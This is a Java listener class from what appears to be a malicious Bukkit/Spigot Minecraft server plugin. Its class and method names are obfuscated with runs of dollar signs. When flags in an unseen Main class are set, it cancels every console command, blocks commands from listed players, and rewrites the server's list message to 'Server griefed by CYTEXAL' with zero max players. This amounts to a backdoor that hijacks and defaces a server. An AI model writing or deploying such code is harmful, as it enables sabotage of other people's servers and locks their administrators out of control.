package com.Skype;

import org.bukkit.Bukkit;
import org.bukkit.command.defaults.ClearCommand;
import org.bukkit.event.Event;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.spigotmc.SpigotConfig;

public class CO$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$7$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ implements Listener {

	private Main plugin;

	public CO$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$7$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$(
			Main main) {
	  this.plugin = main;
	  plugin.getServer().getPluginManager().registerEvents(this, plugin);
	}
	
	
	@EventHandler
	public void $$$$$$$$$$$$$$$$$$$$$$$$$cmd$$$$$$$$$$$$$(ServerCommandEvent e){
		if(Main.c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ == true){
			e.setCancelled(true);
		}
	}
	
	@EventHandler
	public void $$$$$$$$$$$$$$$$$$$$$$$$$cmd$$$$$$$$$$$$(PlayerCommandPreprocessEvent e){
		if(Main.Bl$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.contains(e.getPlayer())){
			e.setCancelled(true);
		  
		}
	}
	
   @EventHandler
   public void $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$mot$$$$$$$$$$$$$$$$(ServerListPingEvent e) {
	  if(Main.moc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ == true){
			 e.setMotd("§cServer griefed by §a§l§oCYTEXAL");
			  e.setMaxPlayers(0);
	  }
   }

}
